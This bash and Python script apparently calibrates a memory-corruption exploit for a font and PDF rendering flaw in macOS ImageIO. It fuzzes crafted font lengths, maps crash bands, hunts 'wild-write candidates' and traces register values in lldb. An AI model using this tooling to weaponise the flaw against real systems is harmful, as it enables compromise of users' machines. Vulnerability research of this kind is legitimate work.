#!/bin/bash
# RIP-10: mega-census — band map -> fine sweep -> canonical classing -> SURVIVOR HUNT
# (rc=0 islands inside crash band = walk survived semi-real redirect = wild-write candidates)
# -> lldb trace of survivors -> fa-x27 vs L curve.
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render4 render4.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
rm -f cal10.txt

./venv/bin/python - << 'PYALL'
import subprocess, os, glob, sys, re, json, time
IPS = os.path.expanduser("~/Library/Logs/DiagnosticReports")
LOG = open("cal10.txt", "w")
def W(*a): print(*a); print(*a, file=LOG); LOG.flush()
FONTMADE = set()
def run(L):
    ttf = f"k2_d{L}.ttf"; pdf = f"k2_d{L}.pdf"
    if L not in FONTMADE:
        subprocess.run(['./venv/bin/python','-c',
            "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('%s', %d)" % (ttf, L)],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['./venv/bin/python','gen_pdf.py',pdf,ttf], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        FONTMADE.add(L)
    r = subprocess.run(['./render4', pdf, 'd.png'], capture_output=True, timeout=120)
    return r.returncode

# PHASE-A: coarse
Ls = list(range(28000, 32761, 128))
rc = {}
t0 = time.time()
for L in Ls: rc[L] = run(L)
W("PHASE-A %ds crash=%s" % (time.time()-t0, sorted(L for L in Ls if rc[L]<0)))
crashA = sorted(L for L in Ls if rc[L] < 0)
if not crashA:
    W("no band this session"); LOG.close(); sys.exit(0)

# PHASE-B: fine step 8 across whole band (cap 320 pts via step16 fallback)
lo, hi = max(27904, crashA[0]-128), min(32760, crashA[-1]+128)
fine = list(range(lo, hi+1, 8))
if len(fine) > 320: fine = fine[::len(fine)//320 + 1]
W("PHASE-B %d pts" % len(fine))
for L in fine: rc[L] = run(L)
crashF = sorted(L for L in rc if rc[L] < 0)
survF = sorted(L for L in rc if rc[L] == 0)
W("PHASE-B crash=%d survive=%d" % (len(crashF), len(survF)))

# PHASE-D: survivor islands INSIDE crash band (neighbors crash both sides)
survivors = []
for L in survF:
    below = [x for x in range(L-64, L) if x in rc and rc[x] < 0]
    above = [x for x in range(L+1, L+65) if x in rc and rc[x] < 0]
    if below and above:
        survivors.append(L)
W("PHASE-D survivor islands: %s" % survivors[:20])

# PHASE-C: ips census on crashers (subsample 35)
sample = crashF[::max(1, len(crashF)//35)][:35]
for L in sample: run(L)
time.sleep(14)
def xval(ts, i):
    try: return ts['x'][i]['value']
    except Exception: return 0
ipsFiles = sorted(glob.glob(IPS + "/render4*.ips"), key=os.path.getmtime)
W("PHASE-C ips: %d" % len(ipsFiles))
curve = []
canon = []
for i, f in enumerate(ipsFiles[-min(35, len(sample)):]):
    L = sample[i] if i < len(sample) else -1
    try:
        raw = json.loads(open(f).read().split('\n',1)[1])
        fa = (raw.get('exception', {}).get('rawCodes', [0,0])[1]) & 0xFFFFFFFFFFFFFFFF
        thr = raw.get('threads',[{}])[raw.get('faultingThread',0)]
        frs = thr.get('frames',[{}])
        site = "+%s" % frs[0].get('symbolLocation','?') if frs else '?'
        ts = thr.get('threadState',{})
        x11, x27 = xval(ts,11), xval(ts,27)
        if x27:
            delta = x27 - fa
            canonc = (0x100000000 <= fa <= 0x7ff000000000) and not (fa >= 0xff00000000000000)
            curve.append((L, site, delta, fa, x27, canonc))
            if canonc: canon.append((L, site, delta))
            W("L=%6d site=%-7s fa=%012x x27=%x delta=-%#x %s" % (L, site, fa, x27, delta, "CANON" if canonc else ""))
            try: os.rename(f, f"ips_d{i}.ips")
            except Exception: pass
    except Exception as e:
        W("L=%s err %s" % (L, e))
W("=== CANON: %s" % canon)
W("=== DELTA CURVE (L, site, x27-fa): %s" % [(c[0], c[1], hex(c[2])) for c in curve if c[5]])
LOG.close()
print("CAL10 DONE")
PYALL

# PHASE-E: lldb trace of up to 3 survivor islands (wild-write evidence)
SURV=$(grep -oE "survivor islands: \[.*\]" detonation/cve-2026-86950/cal10.txt 2>/dev/null | grep -oE "[0-9]+" | head -3)
for L in $SURV; do
{
  echo "breakpoint set -n aa_cache_render"
  echo "process launch -- k2_d${L}.pdf s.png"
  echo "breakpoint delete 1"
  echo "breakpoint set -a \$pc+1804"
  echo "continue"
  echo "register read x27 x22"
  echo "breakpoint delete 2"
  echo "continue"
  echo "bt"
  echo "register read pc x2 x11 x16 x27"
  echo "quit"
} > cmdsS${L}.txt
lldb -b -s cmdsS${L}.txt ./render4 > sessS${L}.txt 2>&1 || true
grep -E "x27 =|frame #|stop reason" sessS${L}.txt | head -8
done

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{cal10.txt} findings/ 2>/dev/null
cp detonation/cve-2026-86950/ips_d*.ips findings/ 2>/dev/null
cp detonation/cve-2026-86950/sessS*.txt findings/ 2>/dev/null
ls findings/ | wc -l
grep -E "PHASE|CANON|survivor" detonation/cve-2026-86950/cal10.txt | tail -12
